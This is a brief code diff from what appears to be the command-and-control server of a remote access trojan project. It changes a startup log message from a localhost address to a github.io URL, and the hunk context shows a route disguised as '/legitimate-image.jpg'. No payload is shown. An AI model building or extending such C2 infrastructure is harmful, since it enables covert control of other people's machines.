@@ -228,5 +228,5 @@ app.get('/legitimate-image.jpg', (req, res) => {
 
 // Start server
 app.listen(PORT, () => {
-    console.log(`C2 Server running on http://localhost:${3000}`);
+    console.log(`C2 Server running on https://sijanxaura.github.io/RAT/c2-server.js`);
 });
